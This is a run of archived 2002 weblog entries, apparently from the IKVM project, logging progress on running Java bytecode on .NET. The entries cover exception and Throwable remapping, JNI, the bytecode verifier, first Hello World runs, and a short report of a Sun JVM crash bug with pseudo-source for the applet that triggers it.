<P>I did some more work on Throwable. In my previous post I forgot to mention that virtual methods in Throwable wheren't overidable yet (because they have no equivalent in System.Exception, I cannot reuse those vtable slots, like I do for System.Object). I implemented a mechanism to support those now. Every direct&nbsp;subclass of Throwable is converted into a .NET subtype of System.Exception and it implements the <EM>Throwable$VirtualMethods</EM> interface. Each virtual invocation of a virtual method in Throwable is redirected to a static method in the class <EM>Throwable$VirtualMethodsHelper </EM>that checks if the type implements the <EM>Throwable$VirtualMethods</EM> interface, if it does, the method is routed there, if it doesn't the method is routed to the C# implementation of the Throwable method in ExceptionHelper.</P>
<P>BTW, the reason that the static helper methods are in a separate class, is because Reflection.Emit (<A href="http://discuss.develop.com/archives/wa.exe?A2=ind0207d&amp;L=dotnet-clr&amp;T=0&amp;F=&amp;S=&amp;P=17600">incorrectly</A>) doesn't allow the definition of static methods in interfaces.</P>
<P>The cool part of all this is that all of this virtual method handling is generic and completely based on the remappings defined in map.xml.</P>
<P>I also implemented the 1.4 stack trace handling, so Throwable is now fully functional.</P>
<P>BTW#2, there is also an alternative way I could have handled the virtual methods, by making Throwable a subtype of System.Exception. I haven't figured out the pros and cons of this, so may be I'll do the alternative implementation in a few days to see if that is a more elegant way of doing it.</P>
<P>Updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/25/2002 18:16:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=26"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=26">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 22 July 2002</h2></div>
<div class="newsItems"><a name="a25"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I did lots of work on exception handling. Most of it now works (fully compatible with&nbsp;J2SE 1.4). Some highlights:</P>
<UL>
<LI>java.lang.Throwable is remapped to System.Exception (for maximum compability with .NET code)</LI>
<LI>Throwable.getMessage(), Throwable.getCause()&nbsp;&amp; Throwable.toString() all work, and are fully compatible with J2SE 1.4. Additionally, the&nbsp;message is stored as the System.Exception.Message property, and when the exception object was constructed with a cause, the System.Exception.InnerException property is set.</LI>
<LI>Stack traces now work (fully Java compatible), except for J2SE 1.4 inner exceptions stack trace dumping.</LI>
<LI>I made the XML remapping language more powerful. It now supports calling helper methods and using locals to twiddle around with method arguments.</LI></UL>
<P>Things that don't work:</P>
<UL>
<LI>When .NET code prints a stacktrace from an exception thrown&nbsp;by&nbsp;Java&nbsp;code, the stacktrace only shows the stack from the last rethrow point in the Java code.</LI>
<LI>Throwable.printStackTrace() doesn't yet support <EM>Caused by: </EM>in the stack traces.</LI>
<LI>Additional exception information object (that contains the stacktrace and the cause)&nbsp; is not yet garbage collected when the exception goes away.</LI></UL>
<P>Here is the <A href="http://www.frijters.net/exctest.java">testcase</A> I used.</P>
<P>Updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/22/2002 19:32:54 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=25"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=25">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 16 July 2002</h2></div>
<div class="newsItems"><a name="a24"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I cleaned up the Visual Studio .NET solution.&nbsp;For now it consists of the following projects:</P>
<UL>
<LI>IK.VM.JNI<BR>This is the Managed C++ project that implements the JNI interface.</LI>
<LI>IK.VM.NET<BR>This is the <EM>Virtual Machine. </EM>It contains the Java classfile parsing, classpath <EM>native</EM> code, method compiler and various other bits.</LI>
<LI>ikvm<BR>This is a very simple C# program that starts up the VM and runs the class specified on the command line. The equivalent of <EM>java.exe </EM>in the JDK.</LI></UL>
<P>Other changes:</P>
<UL>
<LI>I decided to use&nbsp;a license derived from the&nbsp;<A href="http://www.gzip.org/zlib/zlib_license.html">zlib license</A>.</LI>
<LI><A href="http://www.research.avayalabs.com/user/wadler/pizza/gj/">gjc</A> (Generic Java Compiler formerly known as Pizza) now runs (i.e. it compiles Hello, World)</LI>
<LI>The map.xml file is now an embedded resource</LI></UL>
<P>I updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/16/2002 16:52:24 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=24"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=24">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 13 July 2002</h2></div>
<div class="newsItems"><a name="a23"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart <A href="http://weblog.ikvm.net/commentview.aspx/22">commented</A> on the previous item: ...<EM>That leaves #2, which seems hard to me. At the very least, it seems like it would require changes to the Java language compiler to interpret (at least metadata from) .NET classes and allow for those to be in the CLASSPATH at compilation time. Is that something you're interested in pursuing as part of IKVM, or do you regard it as a separate problem? </EM></P>
<P>The way I plan to go about this, is to create a tool that generates&nbsp;jar files from .NET assemblies. The jar will contain all the public classes &amp; interfaces&nbsp;from the .NET assembly, and all the methods will appear&nbsp;to be&nbsp;<EM>native</EM>. Standard Java compilers can then be used to compile against .NET code. The IK.VM will be aware of these special classes (they will contain an attribute to specify the fully qualified .NET&nbsp;type name) and reroute all access to these wrappers to the real .NET types. I haven't&nbsp;built any of this, but I don't expect any problems.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/13/2002 10:31:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=23"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=23">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 10 July 2002</h2></div>
<div class="newsItems"><a name="a22"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I changed the Java to native code transition from my own MC++ marshaling to use the <EM>calli </EM>instruction. The code is much more elegant now, not to mention <STRONG>much </STRONG>faster. My database app now performs on a&nbsp;par with JDK 1.1. Not bad at all.</P>
<P>Also, I implemented support for interfaces that "override" java.lang.Object methods and I remapped java.lang.Comparable to System.IComparable. Both of these features use the same underlying mechanism, i.e. the ability to provide explicit interface implementations that redirect to virtual methods with a different name.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/10/2002 18:18:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=22"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=22">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 08 July 2002</h2></div>
<div class="newsItems"><a name="a21"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Many changes:</P>
<UL>
<LI>Added exception remapping support for some exceptions (NullReferenceException, IndexOutOfRangeException, InvalidCastException &amp; TypeInitializationException) 
<LI>Changed Throwable.printStackTrace() to print out stack traces in Java format 
<LI>Partial support for retaining stack traces when exception is rethrown 
<LI>java.lang.StringBuffer is now remapped to System.Text.StringBuilder 
<LI>Rewrote file IO in classpath because it was buggy 
<LI>Started on an ahead-of-time compiler that also emits debugging information (based on the debugging info in the Java classes)</LI></UL>
<P>Yesterday, I ran into a <A href="http://discuss.develop.com/archives/wa.exe?A2=ind0207b&amp;L=dotnet-cx&amp;T=0&amp;F=&amp;S=&amp;P=53">bug</A> in MC++ when unboxing.</P>
<P>I've updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>&nbsp;and since I've made some changes to classpath, I've now put my modified version of <A href="http://www.frijters.net/classpath-0.04-jf.zip">that</A> online as well.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/08/2002 12:28:53 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=21"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=21">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 04 July 2002</h2></div>
<div class="newsItems"><a name="a20"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		Updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>. Many fixes to the verifier and compiler and I also implemented a few more "native" methods. My company's database server product now works (at least partially), which is a pretty exciting step. It uses JNI to do its file I/O (because it runs on JDK 1.1), so it runs a little slower than under JDK 1.1, but hopefully that will improve once I've optimized the JNI method calling implementation.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/04/2002 15:45:24 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=20"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=20">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 02 July 2002</h2></div>
<div class="newsItems"><a name="a19"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Benchmark</STRONG></P>
<P>Just for fun, I tried to run a FFT program from the IBM <A href="http://www.alphaworks.ibm.com/tech/ninja">Ninja</A>&nbsp;(Numerically Intensive Java) package. After implementing a few more native methods, it ran, but to my surprise it ran about as fast as under JDK 1.4 (with Sun's Hotspot VM). Not bad for totally unoptimized code ;-)</P>
<P>The cfft.java source that I ran can be viewed <A href="http://www.frijters.net/cfft.java">here</A>, the resulting executable (in a zip) can be found <A href="http://www.frijters.net/cfft.zip">here</A>&nbsp;and I've updated the project <A href="http://www.frijters.net/ikvm.zip">snapshot</A>. For the array package, follow the Ninja link.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/02/2002 12:28:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=19"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=19">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a18"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>J# released</STRONG></P>
<P>Yesterday, Microsoft <A href="http://www.microsoft.com/presspass/Press/2002/Jul02/07-01VisualJNETLaunchPR.asp">released</A> J#. When I first looked at it yesterday, I was happy to find that they fixed the&nbsp;huge flaw that existed in beta 2. In the final version they have made java.lang.Object and java.lang.String aliases for System.Object and System.String. So they no longer require a "VerifierFix" to convert System.Object references to java.lang.Object references. Even so, they've decided to remove the AllowPartiallyUntrustedCallers attribute from the J# runtime libraries.</P>
<P>Unfortunately, the rest of the story isn't so positive. In only an hour of trying to compile my Java code, I already encountered&nbsp;three bugs in the compiler and one in the runtime. So I remain very sceptical about the quality of this product.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/02/2002 11:34:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=18"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=18">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 28 June 2002</h2></div>
<div class="newsItems"><a name="a17"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		"Hello, world!" is now fully verifiable. I haven't got all the corner cases of <EM>jsr </EM>support worked out, but the most important chunk of work in handling <EM>try {} catch {}</EM> blocks is now done. Next task is to translate the CLR exceptions (System.NullReferenceException, System.IndexOutOfRangeException, and may be others) into the corresponding Java exceptions.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/28/2002 16:03:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=17"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=17">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 27 June 2002</h2></div>
<div class="newsItems"><a name="a16"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>"Hello, world!" now runs without first having to process&nbsp;the entire transitive closure of classes. It turns out that there is (what I feel) a bug in ModuleBuilder.GetType(string). It can be used to construct array types for types that have not yet been finished, but whenever you do that, it does fire the AppDomain.TypeResolveEvent, which caused me to finish the type (which wouldn't work because it was already in the process of being finished). Fortunately, it's easy to workaround, by setting a flag to&nbsp;ignore the TypeResolveEvent while inside ModuleBuilder.GetType().</P>
<P>Running "Hello, world!" takes slightly less than 2 seconds. So startup performance could be&nbsp;better ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/27/2002 14:33:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=16"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=16">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a15"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		I removed&nbsp;the &lt;&lt; from the title of the blog, because of Radio's problems with them.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/27/2002 13:24:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=15"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=15">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a14"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Hello, world!</STRONG></P>
<P>It's running! Those who have ever implemented a JVM know that running "Hello, World!" requires a very large percentage of the VM to be up and running, so I'm very happy to have reached this point.</P>
<P>If anyone wants to see the results for themselves, a zip file containing the executable and two dlls is available <A href="http://www.frijters.net/hello.zip">here</A>.</P>
<P>The full project is available <A href="http://www.frijters.net/ikvm.zip">here</A>.</P>
<P>There are still many things todo (in no particular order):</P>
<UL>
<LI>Implement jumping into and out of try blocks (run peverify on hello.exe to see what I mean ;-))</LI>
<LI>A&nbsp;few missing bytecodes need to be implemented</LI>
<LI>CLR exceptions need to be mapped to Java exceptions</LI>
<LI>Exceptions should retain their stacktraces even though they are thrown again</LI>
<LI>Many classpath native methods have to be implemented</LI>
<LI>Many JNI methods need to be implemented</LI>
<LI>Figure out how to deal with final fields (CLR initonly is not the same as Java's final. In Java a class is allowed to change a final field (although most JITs don't support that))</LI>
<LI>Figure out a way to make sure that generated types are finished in the proper order, to avoid deadlock. This is a major problem now, if I don't save the dynamic assembly before starting to execute the main method, the loading of classes deadlocks.</LI>
<LI>Many things I haven't even discovered yet ;-)</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/27/2002 12:39:22 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=14"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=14">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 26 June 2002</h2></div>
<div class="newsItems"><a name="a13"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Milestone! I just managed to JIT the entire transitive closure of classes required to run <STRONG>Hello World </STRONG>(304 classes).</P>
<P>It doesn't run yet, because I don't have the required classpath native methods yet and the resulting exe (708KB) contains tons of verification errors, but this is definitely an exciting step.</P>
<P>I had to make a few minor changes to the classpath source:</P>
<UL>
<LI><FONT size=2>
<P>removed java/lang/CharSequence interface from java/lang/String and added workarounds to make it compile after this</FONT></P></LI>
<LI>
<P><FONT size=2><FONT size=2>removed equals() and hashCode() from java/util/Collection</P></LI></FONT></FONT>
<LI><FONT size=2><FONT size=2>
<P>removed equals() from java/util/Comparator</P></FONT></FONT></LI></UL>
<P>The equals() and hashCode() methods in interfaces don't really do anything, but at the moment I cannot handle them. It would be trivial to add code to handle them, but I don't want to hardcode that kind of stuff, all method remapping should be based on the XML file that defines the remappings.</P>
<P>Download <A href="http://www.frijters.net/ikvm.zip">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/26/2002 18:48:04 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=13"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=13">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 25 June 2002</h2></div>
<div class="newsItems"><a name="a12"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I've been trying to get "Hello World" working with the classpath library. I implemented tons of bytecodes, fixed bugs and enhanced the method (and now field) remapping functionality. Still not there yet. I just ran into the problem that the constructors for java.lang.Throwable and System.Exception aren't the same, so for classes derived from java.lang.Throwable I will need to rewrite the call to the superclass constructor, to supply the proper arguments.</P>
<P>I updated the <A href="http://www.frijters.net/ikvm.zip">download</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/25/2002 18:52:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=12"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=12">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 24 June 2002</h2></div>
<div class="newsItems"><a name="a11"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Yesterday, I wrote a partial bytecode verifier to track the types on the stack and in the locals, and based on this, today, I wrote a new bytecode compiler that, instead of decompiling the bytecode into an AST and then recompiling that (as I did previously) just converts individual bytecode instructions. This is a much better approach, as I will now be able to handle all sorts of weird code constructs not typically generated by Java compilers. Of course, it'll also be easier to handle the bytecode that <EM>is</EM> produced by the Java compilers.</P>
<P>The new code can be downloaded&nbsp;<A href="http://www.frijters.net/ikvm.zip">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/24/2002 14:34:18 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=11"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=11">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 21 June 2002</h2></div>
<div class="newsItems"><a name="a10"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Old News</STRONG></P>
<P>Last week as was thinking about local variable handling, I found a bug in Sun's 1.4 JVM. Visit <A href="http://www.frijters.net/crash.html">this</A>&nbsp;url to crash your browser (if you use the Sun JVM, it doesn't work on the MS VM).</P>
<P>The pseudo&nbsp;source for the applet is:</P>
<P><FONT face="Courier, Monospace" size=1>public class test extends Applet<BR>{<BR>&nbsp;&nbsp;&nbsp; synchronized void foo()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this = null;<BR>&nbsp;&nbsp;&nbsp; }</FONT></P>
<P><FONT face="Courier, Monospace" size=1>&nbsp;&nbsp;&nbsp; public void init()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(;;) &nbsp;foo();<BR>&nbsp;&nbsp;&nbsp; }<BR>}</FONT><FONT face=Courier><FONT size=1></P></FONT></FONT>The CLR (and Rotor too) throws an ArgumentNullException for similar code, which isn't ideal either, but at least it isn't crashing.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/21/2002 18:21:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=10"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=10">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 20 June 2002</h2></div>
<div class="newsItems"><a name="a9"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><A href="http://www.quality.nu/dotnetguy/">The .NET Guy</A>: <EM>I believe that if you check out his implementation, he's JITting Java byte-code into MSIL, and then implementing the Java libraries in terms of the .NET BCL. At least, I couldn't see any other way to make it reasonably fast... why re-implement garbage collection if there's already a garbage collector? :)</EM></P>
<P>Right, except that I'm not reimplementing the Java libraries. I plan to use <A href="http://www.classpath.org/">GNU Classpath</A>&nbsp;for that. The only thing I need to reimplement is the native part of it, which I will do in terms of the .NET BCL (as much as possible). It'll be a long while before AWT is running though ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2002 17:02:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a8"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Exception woes</STRONG></P>
<P>I just found another problem with exception handling. There is no way in .NET to throw an exception without overwriting the stack trace information.</P>
<P>When native code is invoked from Java and the native code in turn invokes a Java method which throws an exception, the native code can handle the exception, but if it doesn't the Java code that called the native code gets the exception.</P>
<P>I need the ability to rethrow an existing exception object. In Java the stack trace for the exception is done at construction time, not when the exception is actually thrown.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2002 16:45:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a7"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I forgot Exception in my reply to Sam. I'm still thinking about the exception mappings. java.lang.Throwable should probably map to System.Exception, and then use reflection to emulate the virtual methods that don't correspond, but what to do about java.lang.NullPointerException vs System.NullReferenceException? Obviously when the CLR throws a System.NullReferenceException, Java code should be able to catch it as a java.lang.NullPointerException, but also as a java.lang.Exception or java.lang.RuntimeException.</P>
<P>But what should happen when Java code throws a NullPointerException (or worse, it's own subclass of it)? Should this be translated to System.NullReferenceException? One thing I haven't talked about much is my wish&nbsp;for interoperability between Java and .NET code, but I do intent for it to be possible (and convenient) to use Java class libraries from your C# (or whatever .NET language) code. In order for this to work, the exception mappings need to make sense to both the Java and the .NET side.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2002 12:31:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a6"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><A href="http://radio.weblogs.com/0101679/">Sam Ruby</A>: <EM>I&lt;&lt;K.VM.NET&nbsp;is a Java byte code to CIL converter&nbsp;(some prefer to call it MSIL, but not me).&nbsp; My guess is that Jeroen is using the same hooks that <K.VM.NET&NBSP;IS a href="http://www.iunknown.com/AOP/fog0000000115.html" <A that hooks same the using is Jeroen guess My me).&nbsp; not but MSIL, it call to prefer converter&nbsp;(some CIL code byte Java>CLAW</A> does to modify the byte codes immediately prior to JIT, but in this case the translation is a wee&nbsp;bit more involved. <IMG src="http://static.userland.com/shortcuts/images/qbullets/sidesmiley.gif"></EM></P>
<P>I'm not using the same hooks as CLAW, I'm using the AppDomain.TypeResolve event. This works very well together with Reflection.Emit, because it allows me to lazily emit a type whenever the CLR needs it. The one downside of it is that it doesn't provide&nbsp;the assembly where it thinks the type lives, so when I'm going to implement multiple classloader support I will need to mangle the classnames.</P>
<P><EM>If all goes well, one&nbsp;should be able to&nbsp;simply put JAR files in a CLASSPATH and transparently call Java code from C#.</EM></P>
<P>That's exactly the idea. My starter executable (the equivalent of jre.exe) looks like this:</P>
